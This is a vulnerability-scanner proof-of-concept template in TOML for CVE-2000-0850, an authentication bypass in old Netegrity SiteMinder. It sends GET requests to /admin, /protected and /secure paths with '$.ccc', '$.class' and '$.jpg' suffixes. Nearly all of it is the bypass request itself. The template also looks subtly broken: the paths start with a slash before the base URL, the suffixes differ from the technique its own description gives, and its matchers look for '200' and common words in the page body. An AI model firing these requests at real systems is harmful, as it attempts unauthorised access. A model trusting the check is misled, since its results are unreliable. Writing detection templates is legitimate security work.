[info]
author = "AVE"
description = "检测 Netegrity SiteMinder 4.11 之前版本是否存在认证绕过漏洞，通过向受保护的 URL 后附加 $/FILENAME.ext 尝试绕过身份验证"
id = "POC-AVE-2000-0971"
name = "Netegrity SiteMinder 认证绕过漏洞 PoC"
severity = "high"
tags = ["cve-2000-0850"]
vuln_id = [
    "CVE-2000-0850",
    "AVE-2000-0971",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/admin/$.ccc"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "200",
    "Welcome",
    "Admin",
    "Dashboard",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/protected/$.class"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "200",
    "Welcome",
    "Admin",
    "Dashboard",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/secure/$.jpg"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "200",
    "Welcome",
    "Admin",
    "Dashboard",
]
